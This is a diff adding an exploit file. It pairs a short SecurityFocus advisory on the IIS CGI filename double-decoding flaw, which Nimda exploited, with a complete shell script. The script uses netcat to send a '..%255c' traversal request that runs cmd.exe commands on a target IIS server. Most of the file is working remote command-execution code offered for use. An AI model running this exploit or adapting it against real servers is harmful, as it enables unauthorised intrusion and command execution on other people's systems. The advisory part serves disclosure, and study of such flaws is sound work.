@@ -1,0 +1,72 @@
+source: http://www.securityfocus.com/bid/2708/info
+    
+Due to a flaw in the handling of CGI filename program requests, remote users can execute arbitrary commands on an IIS host.
+    
+When IIS receives a CGI filename request, it automatically performs two actions before completing the request:
+    
+1. IIS decodes the filename to determine the filetype and the legitimacy of the file. IIS then carries out a security check.
+    
+2. When the security check is completed, IIS decodes CGI parameters.
+    
+A flaw in IIS involves a third undocumented action: Typically, IIS decodes only the CGI parameter at this point, yet the previously decoded CGI filename is mistakenly decoded twice. If a malformed filename is submitted and circumvents the initial security check, the undocumented procedure will decode the malformed request, possibly allowing the execution of arbitrary commands.
+    
+Note that arbitrary commands will be run with the IUSR_machinename account privileges. Reportedly, various encoding combinations under Windows 2000 Server and Professional may yield different outcomes.
+    
+Personal Web Server 1.0 and 3.0 are reported vulnerable to this issue.
+    
+The worm Nimda(and variants) actively exploit this vulnerability.
+
+#!/bin/sh
+
+# Copyright 2001 by Leif Jakob <bugtraq@jakob.weite-welt.com>
+#
+# do not abuse this code... blah blah :)
+
+if [ -z "$1" ] ; then
+    echo "usage:"
+    echo "$0 hostname"
+    exit 1
+fi
+
+host="$1"
+
+NETCAT=`which netcat`
+
+if [ -z "$NETCAT" ] ; then
+    NETCAT=`which nc`
+fi
+
+if [ -z "$NETCAT" -o ! -x "$NETCAT" ] ; then
+    echo "you need netcat to make this work"
+    exit 1
+fi
+
+echo "using netcat:$NETCAT"
+
+function makeRequest
+{
+    host="$1"
+    count=$2
+    cmd="$3"
+    echo -n 'GET /scripts/'
+    while [ $count -gt 0 ] ; do
+	echo -n '..%255c'
+	count=$((count-1))
+    done
+    echo -n 'winnt/system32/cmd.exe?/c+'
+    echo -n "$cmd"
+    echo ' HTTP/1.0'
+    echo "Host: $host"
+    echo ''
+    echo 'dummy'
+}
+
+function testHost
+{
+    host="$1"
+    count=10 # you can't overdo it
+    cmd='dir+c:\'
+    makeRequest "$host" "$count" "$cmd" | netcat -w 4 $host 80
+}
+
+testHost "$host"
